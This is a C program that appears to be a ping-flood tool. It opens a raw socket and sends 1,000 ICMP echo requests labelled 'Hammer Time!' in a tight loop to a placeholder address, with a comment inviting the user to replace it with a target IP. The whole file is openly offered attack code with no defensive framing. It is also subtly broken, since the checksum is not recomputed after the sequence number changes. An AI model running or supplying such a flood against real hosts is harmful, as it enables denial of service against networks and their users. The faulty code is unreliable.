#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>


#define PACKET_SIZE 64
#define HAMMER_COUNT 1000


struct icmp_packet {
    struct icmphdr header;
    char data[PACKET_SIZE - sizeof(struct icmphdr)];
};


int main() {
    int sockfd;
    struct sockaddr_in dest;
    struct icmp_packet packet;
    unsigned char *buffer;
    int i;


    // Create raw socket
    if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) < 0) {
        perror("socket");
        exit(1);
    }


    // Set destination address
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr("127.0.0.1"); // Replace with target IP


    // Prepare ICMP packet
    memset(&packet, 0, sizeof(packet));
    packet.header.type = ICMP_ECHO; //ICMP_ECHO_REQUEST
    packet.header.code = 0;
    packet.header.checksum = 0;
    packet.header.un.echo.id = getpid();
    packet.header.un.echo.sequence = 0;
    strcpy(packet.data, "Hammer Time!");


    //Calculate checksum
    packet.header.checksum = 0;
    unsigned short *ptr = (unsigned short *)&packet;
    int checksum = 0;
    int len = sizeof(packet);
    for (int i = 0; i < len / 2; i++){
        checksum += *ptr++;
    }
    if (len % 2){
        checksum += *(unsigned char *)ptr;
    }
    checksum = (checksum >> 16) + (checksum & 0xFFFF);
    checksum += (checksum >> 16);
    packet.header.checksum = ~checksum;



    // Send ICMP packets
    for (i = 0; i < HAMMER_COUNT; i++) {
        if (sendto(sockfd, &packet, sizeof(packet), 0, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
            perror("sendto");
            exit(1);
        }
        packet.header.un.echo.sequence++;
    }


    // Close socket
    close(sockfd);


    return 0;
}
